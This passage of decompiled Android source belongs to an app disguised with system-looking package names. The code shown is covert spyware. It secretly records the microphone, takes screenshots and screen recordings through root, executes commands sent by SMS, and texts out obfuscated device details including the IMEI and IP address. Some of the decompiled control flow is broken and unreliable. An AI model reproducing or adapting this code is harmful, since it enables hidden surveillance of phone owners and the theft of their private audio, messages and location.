      //   11: getstatic 120	com/android/location/PlayService:context	Landroid/content/Context;
      //   14: ifnonnull +10 -> 24
      //   17: ldc 122
      //   19: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   22: iconst_3
      //   23: ireturn
      //   24: getstatic 47	com/android/location/PlayService:iCallRecordState	I
      //   27: iconst_1
      //   28: if_icmpne +10 -> 38
      //   31: ldc 124
      //   33: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   36: iconst_2
      //   37: ireturn
      //   38: aload_0
      //   39: iconst_1
      //   40: putfield 27	ru/mobile/protector/SMSReceiver$AudioMonitor:bRecording	Z
      //   43: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   46: ifnonnull +13 -> 59
      //   49: new 130	android/media/MediaRecorder
      //   52: dup
      //   53: invokespecial 131	android/media/MediaRecorder:<init>	()V
      //   56: putstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   59: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   62: ifnonnull +10 -> 72
      //   65: aload_0
      //   66: iconst_0
      //   67: putfield 27	ru/mobile/protector/SMSReceiver$AudioMonitor:bRecording	Z
      //   70: iconst_3
      //   71: ireturn
      //   72: aconst_null
      //   73: astore 7
      //   75: aconst_null
      //   76: astore 6
      //   78: aload 6
      //   80: astore 4
      //   82: aload 7
      //   84: astore 5
      //   86: new 64	java/lang/StringBuilder
      //   89: dup
      //   90: ldc -123
      //   92: invokespecial 68	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   95: invokestatic 84	com/android/location/PlayService:getCurrentTime	()J
      //   98: invokevirtual 72	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
      //   101: ldc -121
      //   103: invokevirtual 138	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   106: invokevirtual 76	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   109: astore 8
      //   111: aload 6
      //   113: astore 4
      //   115: aload 7
      //   117: astore 5
      //   119: getstatic 120	com/android/location/PlayService:context	Landroid/content/Context;
      //   122: aload 8
      //   124: iconst_0
      //   125: invokevirtual 144	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
      //   128: astore 6
      //   130: aload 6
      //   132: astore 4
      //   134: aload 6
      //   136: astore 5
      //   138: aload 6
      //   140: invokevirtual 150	java/io/FileOutputStream:getFD	()Ljava/io/FileDescriptor;
      //   143: astore 7
      //   145: aload 6
      //   147: astore 4
      //   149: aload 6
      //   151: astore 5
      //   153: aload 8
      //   155: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   158: aload 6
      //   160: astore 4
      //   162: aload 6
      //   164: astore 5
      //   166: aload 8
      //   168: putstatic 154	ru/mobile/protector/SMSReceiver:RecorderOutputFile	Ljava/lang/String;
      //   171: aload 6
      //   173: astore 4
      //   175: aload 6
      //   177: astore 5
      //   179: ldc -100
      //   181: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   184: aload 6
      //   186: astore 4
      //   188: aload 6
      //   190: astore 5
      //   192: new 64	java/lang/StringBuilder
      //   195: dup
      //   196: ldc -98
      //   198: invokespecial 68	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   201: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   204: invokevirtual 161	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
      //   207: invokevirtual 76	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   210: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   213: aload 6
      //   215: astore 4
      //   217: aload 6
      //   219: astore 5
      //   221: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   224: aload 7
      //   226: invokevirtual 165	android/media/MediaRecorder:setOutputFile	(Ljava/io/FileDescriptor;)V
      //   229: aload 6
      //   231: astore 4
      //   233: aload 6
      //   235: astore 5
      //   237: ldc -89
      //   239: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   242: aload 6
      //   244: astore 4
      //   246: aload 6
      //   248: astore 5
      //   250: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   253: iconst_1
      //   254: invokevirtual 171	android/media/MediaRecorder:setAudioSource	(I)V
      //   257: aload 6
      //   259: astore 4
      //   261: aload 6
      //   263: astore 5
      //   265: ldc -83
      //   267: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   270: aload 6
      //   272: astore 4
      //   274: aload 6
      //   276: astore 5
      //   278: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   281: iconst_1
      //   282: invokevirtual 176	android/media/MediaRecorder:setOutputFormat	(I)V
      //   285: aload 6
      //   287: astore 4
      //   289: aload 6
      //   291: astore 5
      //   293: ldc -78
      //   295: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   298: aload 6
      //   300: astore 4
      //   302: aload 6
      //   304: astore 5
      //   306: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   309: iconst_1
      //   310: invokevirtual 181	android/media/MediaRecorder:setAudioEncoder	(I)V
      //   313: aload 6
      //   315: astore 4
      //   317: aload 6
      //   319: astore 5
      //   321: ldc -73
      //   323: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   326: aload 6
      //   328: astore 4
      //   330: aload 6
      //   332: astore 5
      //   334: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   337: invokevirtual 186	android/media/MediaRecorder:prepare	()V
      //   340: aload 6
      //   342: astore 4
      //   344: aload 6
      //   346: astore 5
      //   348: ldc -68
      //   350: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   353: aload 6
      //   355: astore 4
      //   357: aload 6
      //   359: astore 5
      //   361: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   364: invokevirtual 191	android/media/MediaRecorder:start	()V
      //   367: aload 6
      //   369: astore 4
      //   371: aload 6
      //   373: astore 5
      //   375: ldc -63
      //   377: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   380: aload 6
      //   382: astore 4
      //   384: aload 6
      //   386: astore 5
      //   388: new 64	java/lang/StringBuilder
      //   391: dup
      //   392: ldc -61
      //   394: invokespecial 68	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   397: aload 8
      //   399: invokevirtual 138	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   402: invokevirtual 76	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   405: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   408: aload 6
      //   410: astore 4
      //   412: aload 6
      //   414: astore 5
      //   416: aload_0
      //   417: iload_3
      //   418: putfield 35	ru/mobile/protector/SMSReceiver$AudioMonitor:iTaskID	I
      //   421: aload 6
      //   423: ifnull +8 -> 431
      //   426: aload 6
      //   428: invokevirtual 198	java/io/FileOutputStream:close	()V
      //   431: aload_0
      //   432: invokestatic 84	com/android/location/PlayService:getCurrentTime	()J
      //   435: putfield 29	ru/mobile/protector/SMSReceiver$AudioMonitor:iStart	J
      //   438: aload_0
      //   439: lload_1
      //   440: putfield 31	ru/mobile/protector/SMSReceiver$AudioMonitor:iDelay	J
      //   443: iconst_0
      //   444: ireturn
      //   445: astore 6
      //   447: aload 4
      //   449: astore 5
      //   451: aload 6
      //   453: ldc -56
      //   455: invokestatic 105	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   458: aload 4
      //   460: astore 5
      //   462: aload_0
      //   463: iconst_0
      //   464: putfield 27	ru/mobile/protector/SMSReceiver$AudioMonitor:bRecording	Z
      //   467: aload 4
      //   469: astore 5
      //   471: aload 6
      //   473: invokevirtual 203	java/lang/Exception:printStackTrace	()V
      //   476: aload 4
      //   478: astore 5
      //   480: getstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   483: invokevirtual 206	android/media/MediaRecorder:release	()V
      //   486: aload 4
      //   488: astore 5
      //   490: getstatic 210	com/android/location/PlayService:res	Landroid/content/res/Resources;
      //   493: ldc -45
      //   495: invokevirtual 217	android/content/res/Resources:getString	(I)Ljava/lang/String;
      //   498: invokestatic 220	com/android/location/PlayService:putEvent	(Ljava/lang/String;)V
      //   501: aload 4
      //   503: astore 5
      //   505: aconst_null
      //   506: putstatic 128	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   509: aload 4
      //   511: ifnull -80 -> 431
      //   514: aload 4
      //   516: invokevirtual 198	java/io/FileOutputStream:close	()V
      //   519: goto -88 -> 431
      //   522: astore 4
      //   524: goto -93 -> 431
      //   527: astore 4
      //   529: aload 5
      //   531: ifnull +8 -> 539
      //   534: aload 5
      //   536: invokevirtual 198	java/io/FileOutputStream:close	()V
      //   539: aload 4
      //   541: athrow
      //   542: astore 5
      //   544: goto -5 -> 539
      //   547: astore 4
      //   549: goto -118 -> 431
      //   552: astore 5
      //   554: goto -53 -> 501
      // Local variable table:
      //   start	length	slot	name	signature
      //   0	557	0	this	AudioMonitor
      //   0	557	1	paramLong	long
      //   0	557	3	paramInt	int
      //   80	435	4	localFileOutputStream1	java.io.FileOutputStream
      //   522	1	4	localIOException1	IOException
      //   527	13	4	localObject1	Object
      //   547	1	4	localIOException2	IOException
      //   84	451	5	localObject2	Object
      //   542	1	5	localIOException3	IOException
      //   552	1	5	localException1	Exception
      //   76	351	6	localFileOutputStream2	java.io.FileOutputStream
      //   445	27	6	localException2	Exception
      //   73	152	7	localFileDescriptor	java.io.FileDescriptor
      //   109	289	8	str	String
      // Exception table:
      //   from	to	target	type
      //   86	111	445	java/lang/Exception
      //   119	130	445	java/lang/Exception
      //   138	145	445	java/lang/Exception
      //   153	158	445	java/lang/Exception
      //   166	171	445	java/lang/Exception
      //   179	184	445	java/lang/Exception
      //   192	213	445	java/lang/Exception
      //   221	229	445	java/lang/Exception
      //   237	242	445	java/lang/Exception
      //   250	257	445	java/lang/Exception
      //   265	270	445	java/lang/Exception
      //   278	285	445	java/lang/Exception
      //   293	298	445	java/lang/Exception
      //   306	313	445	java/lang/Exception
      //   321	326	445	java/lang/Exception
      //   334	340	445	java/lang/Exception
      //   348	353	445	java/lang/Exception
      //   361	367	445	java/lang/Exception
      //   375	380	445	java/lang/Exception
      //   388	408	445	java/lang/Exception
      //   416	421	445	java/lang/Exception
      //   514	519	522	java/io/IOException
      //   86	111	527	finally
      //   119	130	527	finally
      //   138	145	527	finally
      //   153	158	527	finally
      //   166	171	527	finally
      //   179	184	527	finally
      //   192	213	527	finally
      //   221	229	527	finally
      //   237	242	527	finally
      //   250	257	527	finally
      //   265	270	527	finally
      //   278	285	527	finally
      //   293	298	527	finally
      //   306	313	527	finally
      //   321	326	527	finally
      //   334	340	527	finally
      //   348	353	527	finally
      //   361	367	527	finally
      //   375	380	527	finally
      //   388	408	527	finally
      //   416	421	527	finally
      //   451	458	527	finally
      //   462	467	527	finally
      //   471	476	527	finally
      //   480	486	527	finally
      //   490	501	527	finally
      //   505	509	527	finally
      //   534	539	542	java/io/IOException
      //   426	431	547	java/io/IOException
      //   480	486	552	java/lang/Exception
      //   490	501	552	java/lang/Exception
    }
    
    public void StopRecordAndSaveAudio()
    {
      SMSReceiver.FLOG("StopAudio");
      this.iStart = 0L;
      this.iDelay = 0L;
      if (!this.bRecording) {}
      while ((PlayService.recorder == null) || (PlayService.ref == null)) {
        return;
      }
      PlayService.recorder.stop();
      PlayService.recorder.reset();
      PlayService.recorder.release();
      PlayService.recorder = null;
      SMSReceiver.FLOG("recorder = null;");
      this.bRecording = false;
      File localFile = new File(PlayService.context.getFilesDir() + "/" + SMSReceiver.RecorderOutputFile);
      if ((localFile != null) && (localFile.exists()))
      {
        ContentValues localContentValues = new ContentValues();
        localContentValues.put("filename", SMSReceiver.RecorderOutputFile);
        localContentValues.put("calldate", Long.valueOf(PlayService.getCurrentTime()));
        localContentValues.put("filesize", Long.valueOf(localFile.length()));
        localContentValues.put("name", "mic");
        localContentValues.put("number", Integer.valueOf(0));
        localContentValues.put("duration", Long.valueOf(localFile.length()));
        PlayService.ref.getContentResolver().insert(BackupData.CONTENT_URI, localContentValues);
      }
      SMSReceiver.FLOG("return;");
    }
    
    public void run()
    {
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      this.running = true;
      SMSReceiver.FLOG("AudioMonitor::Created!");
      Looper.prepare();
      try
      {
        sleep(5000L);
        boolean bool = this.running;
        if (!bool)
        {
          SMSReceiver.FLOG("AudioMonitor::FINISHED ^(");
          return;
        }
        this.bSkipSleep = false;
        SMSReceiver.FLOG("AudioMonitor::getTasks()");
      }
      catch (Exception localException2)
      {
        try
        {
          ContentResolver localContentResolver = PlayService.ref.getContentResolver();
          localObject = TaskProvider.CONTENT_URI;
          SMSReceiver.FLOG(((Uri)localObject).toString());
          localObject = localContentResolver.query((Uri)localObject, null, null, null, "priority,timepoint");
          if (localObject == null)
          {
            SMSReceiver.FLOG("AudioMonitor::No rectask entries, returning...");
            SMSReceiver.FLOG("AudioMonitor::CheckFinish");
          }
        }
        catch (Exception localException2)
        {
          label1077:
          label1117:
          label1156:
          label1169:
          for (;;)
          {
            int i;
            long l;
            try
            {
              Object localObject;
              if (this.bRecording)
              {
                if (PlayService.getCurrentTime() > this.iStart + this.iDelay * 60L * 1000L)
                {
                  SMSReceiver.FLOG("AudioStopper::Stop by record time reached");
                  StopRecordAndSaveAudio();
                  SMSReceiver.this.DeleteAudioTask(this.iTaskID);
                  this.iTaskID = 0;
                }
              }
              else
              {
                SMSReceiver.FLOG("AudioMonitor::sleep");
                i = 6;
                if (this.bSkipSleep) {
                  break label1169;
                }
                if (i > 0) {
                  break label1156;
                }
                SMSReceiver.FLOG("AudioMonitor::awake");
                continue;
                localException1 = localException1;
                PlayService.EXCEPT(localException1, "AudioMonitor DIED");
                continue;
                if (((Cursor)localObject).getCount() == 0)
                {
                  SMSReceiver.FLOG("AudioMonitor::No rectask entries, returning...");
                  ((Cursor)localObject).close();
                  continue;
                  localException2 = localException2;
                  PlayService.EXCEPT(localException2, "AM:getTasks()");
                  continue;
                }
                SMSReceiver.FLOG("AudioMonitor::got records:" + ((Cursor)localObject).getCount());
                try
                {
                  if (((Cursor)localObject).moveToFirst())
                  {
                    k = ((Cursor)localObject).getColumnIndex("_ID");
                    int m = ((Cursor)localObject).getColumnIndex("command_id");
                    j = ((Cursor)localObject).getColumnIndex("minutes");
                    i = ((Cursor)localObject).getColumnIndex("timepoint");
                    k = ((Cursor)localObject).getInt(k);
                    m = ((Cursor)localObject).getInt(m);
                    j = ((Cursor)localObject).getInt(j);
                    l = ((Cursor)localObject).getLong(i);
                    SMSReceiver.FLOG("REC: *" + m + "*" + j + ":" + l);
                    SMSReceiver.FLOG("now=" + PlayService.getCurrentTime() + "->" + IsRecording());
                    switch (m)
                    {
                    }
                  }
                }
                catch (Exception localException3)
                {
                  int k;
                  int j;
                  PlayService.EXCEPT(localException3, "error reading task map");
                  continue;
                  StopRecordAndSaveAudio();
                  localException3.delete(TaskProvider.CONTENT_URI, "command_id = 108", null);
                  localException3.delete(TaskProvider.CONTENT_URI, "_ID = " + k, null);
                  if (this.iTaskID <= 0) {
                    continue;
                  }
                  SMSReceiver.this.DeleteAudioTask(this.iTaskID);
                  continue;
                  if ((IsRecording()) || (l >= PlayService.getCurrentTime() / 1000L)) {
                    continue;
                  }
                  SMSReceiver.FLOG(l + "lower" + PlayService.getCurrentTime() / 1000L);
                  if (StartAudio(j, k) == 0) {
                    continue;
                  }
                  SMSReceiver.FLOG("failed start record due to some reasons");
                  localException3.delete(TaskProvider.CONTENT_URI, "_ID = " + k, null);
                  SMSReceiver.FLOG("RecTask deleted#" + k);
                  continue;
                  SMSReceiver.FLOG("Cant start recording due to another recording or too early");
                  continue;
                }
                ((Cursor)localObject).close();
                continue;
                StopRecordAndSaveAudio();
                localException2.delete(TaskProvider.CONTENT_URI, null, null);
                if (this.iTaskID <= 0) {
                  continue;
                }
                SMSReceiver.this.DeleteAudioTask(this.iTaskID);
                continue;
              }
              if (PlayService.context == null) {
                continue;
              }
              File localFile = new File(PlayService.context.getFilesDir() + "/" + SMSReceiver.RecorderOutputFile);
              if ((localFile == null) || (!localFile.exists())) {
                break label1117;
              }
              SMSReceiver.FLOG("as:" + localFile.length() + "/" + PlayService.iMaxAudioListenFile);
              if ((localFile.length() == 0L) && (PlayService.getCurrentTime() > this.iStart + 18000000L))
              {
                SMSReceiver.FLOG("RECORDER IS NOT RECORDING, I DIE!");
                StopRecordAndSaveAudio();
                SMSReceiver.this.DeleteAudioTask(this.iTaskID);
                this.iTaskID = 0;
                continue;
              }
            }
            catch (Exception localException4)
            {
              PlayService.EXCEPT(localException4, "AM:checkFinish()");
            }
            SMSReceiver.FLOG("as:I");
            if (localException4.length() > PlayService.iMaxAudioListenFile)
            {
              SMSReceiver.FLOG("as:III");
              l = (this.iStart + this.iDelay * 60L * 1000L - PlayService.getCurrentTime()) / 60000L;
              SMSReceiver.FLOG("Stoppper: file > MAXKb, restarting, left:" + l);
              StopRecordAndSaveAudio();
              if (l <= 0L) {
                break label1077;
              }
              SMSReceiver.FLOG("Starting new audio file " + l);
              StartAudio(l, this.iTaskID);
              SMSReceiver.this.UpdateAudioTask(this.iTaskID, l);
            }
            for (;;)
            {
              SMSReceiver.FLOG("as:V");
              SMSReceiver.FLOG("as:II");
              break;
              SMSReceiver.FLOG("CANNOT start, time is over " + l);
              SMSReceiver.this.DeleteAudioTask(this.iTaskID);
              this.iTaskID = 0;
            }
            if (PlayService.getCurrentTime() > this.iStart + 18000000L)
            {
              StopRecordAndSaveAudio();
              SMSReceiver.this.DeleteAudioTask(this.iTaskID);
              SMSReceiver.FLOG("RECORDER IS NOT RECORDING, I DIE2!");
              continue;
              sleep(10000L);
              i -= 1;
            }
          }
        }
      }
    }
    
    public void shutdown()
    {
      this.running = false;
    }
  }
  
  public class Commandor
    extends Thread
  {
    volatile ArrayList<SMSReceiver.ips> list = new ArrayList();
    
    public Commandor() {}
    
    public void Push(int paramInt, String paramString1, String paramString2)
    {
      this.list.add(new SMSReceiver.ips(SMSReceiver.this, paramInt, paramString1, paramString2));
    }
    
    public void run()
    {
      SMSReceiver.FLOG("Commandor started");
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      for (;;)
      {
        try
        {
          if (!this.list.isEmpty()) {
            break label81;
          }
          sleep(10000L);
          continue;
          if (this.list == null) {
            continue;
          }
        }
        catch (Exception localException)
        {
          PlayService.EXCEPT(localException, "Commandor main cycle DIED");
        }
        if (!this.list.isEmpty())
        {
          this.list.remove(0);
          continue;
          label81:
          SMSReceiver.FLOG("CR:get a command");
          SMSReceiver.ips localIps = (SMSReceiver.ips)this.list.get(0);
          SMSReceiver.FLOG("CR0:" + localIps.iCommand);
          SMSReceiver.FLOG("CR1:" + localIps.sData);
          SMSReceiver.FLOG("CR2:" + localIps.sNumber);
          String str = SMSReceiver.CommandProcess(localIps.iCommand, localIps.sData, localIps.sNumber, false, SMSReceiver.this.lastKnown);
          if ((str != null) && (str.length() > 0)) {
            SMSReceiver.this.sendSMS(localIps.sNumber, str);
          }
          this.list.remove(0);
          PlayService.SaveSettings();
        }
      }
    }
  }
  
  public class HTTPChecker
    extends Thread
  {
    private boolean admin;
    private String phonenumber = "";
    private boolean running;
    
    public HTTPChecker(boolean paramBoolean)
    {
      this.admin = paramBoolean;
    }
    
    String Obfuscate(String paramString)
    {
      paramString = paramString.getBytes();
      int i = 0;
      for (;;)
      {
        if (i >= paramString.length) {
          return new String(paramString);
        }
        if ((paramString[i] >= 48) && (paramString[i] <= 57))
        {
          int j = paramString[i];
          paramString[i] = new byte[] { 126, 61, 33, 64, 35, 36, 37, 94, 38, 42 }[(j - 48)];
        }
        i += 1;
      }
    }
    
    public boolean isRunning()
    {
      return this.running;
    }
    
    public void run()
    {
      int j = 1;
      this.running = true;
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      SMSReceiver.FLOG("HTTPChecker::STARTED");
      Looper.prepare();
      Object localObject2 = "";
      Object localObject1 = localObject2;
      for (;;)
      {
        try
        {
          if (PlayService.ref == null) {
            continue;
          }
          localObject1 = localObject2;
          if (PlayService.context == null) {
            continue;
          }
          localObject1 = localObject2;
          Object localObject3 = new int[6];
          localObject1 = localObject2;
          SMSReceiver.FLOG("HTTPChecker::isGet[0]");
          localObject1 = localObject2;
          localObject3[0] = SMSReceiver.isGet(PlayService.Server);
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz[0]=" + localObject3[0]);
          localObject1 = localObject2;
          SMSReceiver.FLOG("HTTPChecker::isGet[1]");
          localObject1 = localObject2;
          localObject3[1] = SMSReceiver.isGet("93.158.134.203");
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz[1]=" + localObject3[1]);
          localObject1 = localObject2;
          localObject3[2] = SMSReceiver.isGet2(PlayService.Server);
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz[2]=" + localObject3[2]);
          localObject1 = localObject2;
          localObject3[3] = SMSReceiver.isGet("173.194.66.138");
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz[3]=" + localObject3[3]);
          localObject1 = localObject2;
          localObject3[4] = SMSReceiver.isGet("98.138.253.109");
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz[4]=" + localObject3[4]);
          localObject3[5] = 0;
          localObject1 = localObject2;
          if ("mounted".equals(Environment.getExternalStorageState())) {
            localObject3[5] = 1;
          }
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz_6");
          localObject1 = localObject2;
          localObject2 = localObject3[0] + localObject3[1] + localObject3[2] + localObject3[3] + localObject3[4] + localObject3[5] + "." + PlayService.SOFT_VERSION;
          localObject1 = localObject2;
          localObject3 = new int[5];
          localObject3[4] = 0;
          localObject3[3] = 0;
          localObject3[2] = 0;
          localObject3[1] = 0;
          localObject3[0] = 0;
          localObject1 = localObject2;
          if (PlayService.ref.thUploader != null)
          {
            localObject1 = localObject2;
            if (PlayService.ref.thUploader.isAlive()) {
              localObject3[0] = 1;
            }
          }
          localObject1 = localObject2;
          if (PlayService.ref.thSMSCopier != null)
          {
            localObject1 = localObject2;
            if (PlayService.ref.thSMSCopier.isAlive()) {
              localObject3[1] = 1;
            }
          }
          localObject1 = localObject2;
          if (SMSReceiver.reference.thAudio != null)
          {
            localObject1 = localObject2;
            if (SMSReceiver.reference.thAudio.isAlive()) {
              localObject3[2] = 1;
            }
          }
          localObject1 = localObject2;
          if (SMSReceiver.reference.thCommandor != null)
          {
            localObject1 = localObject2;
            if (SMSReceiver.reference.thCommandor.isAlive()) {
              localObject3[3] = 1;
            }
          }
          localObject1 = localObject2;
          if (PlayService.ref.wifiAndCellCollector != null)
          {
            localObject1 = localObject2;
            if (PlayService.ref.wifiAndCellCollector.isAlive()) {
              localObject3[4] = 1;
            }
          }
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz_7");
          localObject1 = localObject2;
          localObject2 = localObject2 + "." + localObject3[0] + localObject3[1] + localObject3[2] + localObject3[3] + localObject3[4];
          localObject1 = localObject2;
          localObject3 = new StringBuilder(String.valueOf(localObject2)).append(".").append(PlayService.iCallRecordState);
          localObject1 = localObject2;
          if (!SMSReceiver.IsAudioRecording()) {
            continue;
          }
          i = 1;
          localObject1 = localObject2;
          localObject3 = ((StringBuilder)localObject3).append(i);
          localObject1 = localObject2;
          if (!PlayService.bWork) {
            continue;
          }
          i = j;
          localObject1 = localObject2;
          localObject2 = i;
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz_8");
          localObject1 = localObject2;
          localObject2 = localObject2 + "." + PlayService.sIMEI;
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz_9");
          localObject1 = localObject2;
          localObject2 = localObject2 + "." + SMSReceiver.myip_ru();
          localObject1 = localObject2;
          SMSReceiver.FLOG("diagnoz_10");
          localObject1 = localObject2;
          localObject3 = localObject2 + "." + PlayService.now();
          localObject1 = localObject3;
          File localFile = new File(PlayService.context.getFilesDir() + "/" + "mydata");
          localObject2 = localObject3;
          if (localFile != null)
          {
            localObject2 = localObject3;
            localObject1 = localObject3;
            if (localFile.exists())
            {
              localObject1 = localObject3;
              localObject2 = localObject3 + "." + localFile.length();
            }
          }
          localObject3 = localObject2;
          localObject1 = localObject2;
          if (this.admin)
          {
            localObject1 = localObject2;
            localObject2 = localObject2 + "." + PlayService.Server + "." + PlayService.Port;
            localObject1 = localObject2;
            localObject3 = localObject2 + "." + PlayService.iUploadInterval;
          }
          localObject1 = localObject3;
          SMSReceiver.FLOG("before Encode " + (String)localObject3);
          localObject1 = localObject3;
          localObject2 = Obfuscate((String)localObject3);
          localObject1 = localObject2;
          SMSReceiver.FLOG("after Encode " + (String)localObject2);
          localObject1 = localObject2;
          SMSReceiver.this.sendSMS(this.phonenumber, (String)localObject2);
          localObject1 = localObject2;
        }
        catch (Exception localException)
        {
          int i;
          localException.printStackTrace();
          SMSReceiver.this.sendSMS(this.phonenumber, "Exception");
          continue;
        }
        SMSReceiver.FLOG("Checker finished!" + localObject1);
        SMSReceiver.thChecker = null;
        return;
        i = 0;
        continue;
        i = 0;
        continue;
        localObject2 = "Error:Main thread is dead";
      }
    }
    
    public void setNumber(String paramString)
    {
      this.phonenumber = paramString;
    }
    
    public void shutdown()
    {
      this.running = false;
    }
  }
  
  public class ScreenRecorder
    extends Thread
  {
    volatile ArrayList<String> list = new ArrayList();
    volatile ArrayList<SMSReceiver.StringTrike> ready = new ArrayList();
    
    public ScreenRecorder() {}
    
    public void AddTask(String paramString)
    {
      this.list.add(paramString);
    }
    
    public SMSReceiver.StringTrike getLink()
    {
      if (this.ready.isEmpty()) {
        return null;
      }
      SMSReceiver.StringTrike localStringTrike = (SMSReceiver.StringTrike)this.ready.get(0);
      this.ready.remove(0);
      return localStringTrike;
    }
    
    public void run()
    {
      SMSReceiver.FLOG("ScreenRecorder started");
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      for (;;)
      {
        try
        {
          if (!this.list.isEmpty()) {
            break;
          }
          sleep(10000L);
          continue;
          if (this.list == null) {
            continue;
          }
        }
        catch (Exception localException)
        {
          PlayService.EXCEPT(localException, "ScreenRecorder main cycle DIED");
        }
        while (!this.list.isEmpty()) {
          this.list.remove(0);
        }
      }
      SMSReceiver.FLOG("SR:get a command");
      int i = Integer.parseInt(((String)this.list.get(0)).trim());
      SMSReceiver.FLOG("SR_time:" + i + " secs");
      if (PlayService.bCanSu == PlayService.CAN) {
        if ((i >= 10) && (i <= 3600))
        {
          String str1 = Long.toString(PlayService.getCurrentTime() / 1000L);
          String str2 = Environment.getExternalStorageDirectory() + "/" + str1;
          SMSReceiver.StringTrike localStringTrike = new SMSReceiver.StringTrike(SMSReceiver.this);
          localStringTrike.Alfa = str2;
          localStringTrike.Beta = str1;
          localStringTrike.Gamma = (PlayService.res.getString(2130968653) + "_" + PlayService.now_format("dd.MM.yyyy_HH:mm:ss"));
          localStringTrike.Delta = Integer.toString(i);
          SMSReceiver.FLOG("Filename=" + str2);
          str1 = "screenrecord --time-limit " + i + " " + str2;
          SMSReceiver.FLOG("commandr=" + str1);
          SMSReceiver.commandSU(str1);
          SMSReceiver.FLOG("screenrec finished");
          this.ready.add(localStringTrike);
        }
      }
      for (;;)
      {
        this.list.remove(0);
        break;
        SMSReceiver.FLOG("SR:error:" + i + ", time must be between 10s and 3600s");
        continue;
        SMSReceiver.FLOG("Can't record screen without su");
      }
    }
  }
  
  public class ScreenShooter
    extends Thread
  {
    private int count;
    private int mins;
    
    public ScreenShooter(int paramInt1, int paramInt2)
    {
      this.mins = paramInt1;
      this.count = paramInt2;
    }
    
    public void run()
    {
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      SMSReceiver.FLOG("ScreenShooter started");
      int i = 0;
      long l = PlayService.getCurrentTime();
      for (;;)
      {
        if (this.count <= 0)
        {
          SMSReceiver.FLOG("ScreenShooter finished");
          return;
        }
        try
        {
          SMSReceiver.commandSU("/system/bin/screencap -p " + PlayService.dataPath + "/files/screenshot" + l + i + ".png");
          Thread.sleep(this.mins * 60 * 1000);
          this.count -= 1;
          i += 1;
        }
        catch (Exception localException)
        {
          for (;;)
          {
            PlayService.EXCEPT(localException, "ScreenShooter");
          }
        }
      }
    }
  }
  
  public class StringTrike
  {
    public String Alfa;
    public String Beta;
    public String Delta;
    public String Gamma;
    
    public StringTrike() {}
  }
  
  public class WifiCatcher
    extends Thread
  {
    public WifiCatcher() {}
    
    public void run()
    {
